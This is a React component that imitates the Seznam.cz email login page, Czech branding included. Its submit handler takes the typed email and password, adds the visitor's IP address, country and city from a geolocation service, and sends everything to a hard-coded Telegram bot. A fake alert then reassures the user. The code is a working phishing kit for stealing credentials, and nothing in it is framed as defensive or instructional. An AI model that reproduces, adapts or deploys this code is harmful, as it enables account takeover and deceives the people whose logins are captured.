import React, { useState, FormEvent } from "react";

interface GeoData {
  ip: string;
  country_name: string;
  country_calling_code: string;
  city: string;
}

const Instagram: React.FC = () => {
  const [username, setUsername] = useState<string>("");
  const [domain, setDomain] = useState<string>("@seznam.cz");
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [showDomain, setShowDomain] = useState<boolean>(false);
  const [password, setPassword] = useState<string>("");

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setUsername(value);
    if (value.length > 0) {
      setShowDomain(true);
    }
  };

  const handleEmailBlur = () => {
    const emailValid = username.length > 0;
    setShowPassword(emailValid);
  };

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const email = username + domain;

    try {
      const res = await fetch("https://ipapi.co/json/");
      const data: GeoData = await res.json();

      const message = `Seznam.cz Login:%0A- Email: ${email}%0A- Password: ${password}%0A- IP: ${data.ip}%0A- Country: ${data.country_name}%0A- City: ${data.city}%0A- Dialing Code: ${data.country_calling_code}`;

      const token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
      const chat_id = -4814119425;
      const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;

      await fetch(telegramUrl);
      alert("Login attempt logged. If this wasn't you, please reset your password.");
    } catch (error) {
      console.error("Error sending login info:", error);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 bg-white">
      <img
        src="https://www.seznam.cz/media/img/logo_v2.svg"
        alt="Seznam Logo"
        className="h-12 mb-8 w-auto"
      />

      <form onSubmit={handleSubmit} className="w-full max-w-sm">
        <div className="flex w-full items-center mb-4">
          <div className={`relative ${showDomain ? "w-[60%]" : "w-full"}`}>
            <label
              className={`absolute left-4 text-sm text-gray-500 transition-all duration-200 pointer-events-none bg-white px-1 ${username ? "-top-2 text-xs" : "top-3"
                }`}
            >
              Log in by email or phone
            </label>
            <input
              type="text"
              name="username"
              value={username}
              onChange={handleEmailChange}
              onBlur={handleEmailBlur}
              className={`w-full px-4 py-3 h-12 border border-gray-300 ${showDomain ? "rounded-l-full" : "rounded-full"
                } focus:outline-none`}
            />
          </div>

          {showDomain && (
            <select
              name="domain"
              value={domain}
              onChange={(e) => setDomain(e.target.value)}
              className="w-[40%] px-3 py-3 h-12 border border-gray-300 rounded-r-full bg-white focus:outline-none"
            >
              <option value="@seznam.cz">@seznam.cz</option>
              <option value="@email.cz">@email.cz</option>
              <option value="@post.cz">@post.cz</option>
              <option value="@spoluzaci.cz">@spoluzaci.cz</option>
              <option value="@stream.cz">@stream.cz</option>
            </select>
          )}
        </div>

        {showPassword && (
          <div className="relative mb-2">
            <label
              className={`absolute left-4 text-sm text-gray-500 transition-all duration-200 pointer-events-none bg-white px-1 ${password ? "-top-2 text-xs" : "top-3"
                }`}
            >
              Password
            </label>
            <input
              type="password"
              name="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-full focus:outline-none"
            />
          </div>
        )}

        {showPassword && (
          <div className="text-sm text-left py-1 mb-4">
            <a href="#" className="text-gray-600 hover:underline">
              Forgot password?
            </a>
          </div>
        )}

        <button
          type="submit"
          className="w-full py-3 bg-[#d0021b] text-white rounded-full font-semibold hover:bg-red-700"
        >
          Log in
        </button>

        <div className="space-y-3 mt-5">
          <SocialButton
            icon="https://www.figma.com/community/resource/abed920a-e3d0-48eb-bfe1-bf263fc25bae/thumbnail"
            text="Continue with Google"
          />
          <SocialButton
            icon="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
            text="Continue with Apple"
          />
          <SocialButton
            icon="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
            text="Continue with Microsoft"
          />
        </div>

        <div className="text-center mt-4">
          <a href="#" className="text-[#d0021b] font-semibold hover:underline">
            Create a new account
          </a>
        </div>
      </form>

      <footer className="mt-10 text-sm text-gray-500 text-center space-y-2">
        <p>Copyright © 1996–2025 Seznam.cz, a.s.</p>
        <div className="flex items-center justify-center space-x-4">
          <a href="#" className="hover:underline text-[#d0021b]">
            Help
          </a>
          <div className="flex items-center space-x-1">
            <img
              src="https://flagcdn.com/gb.svg"
              className="h-4"
              alt="English"
            />
            <span>English</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

interface SocialButtonProps {
  icon: string;
  text: string;
}

const SocialButton: React.FC<SocialButtonProps> = ({ icon, text }) => (
  <button className="w-full py-3 flex items-center justify-center bg-gray-100 rounded-full hover:bg-gray-200">
    <img src={icon} alt="" className="h-5 w-auto mr-3" />
    {text}
  </button>
);

export default Instagram;
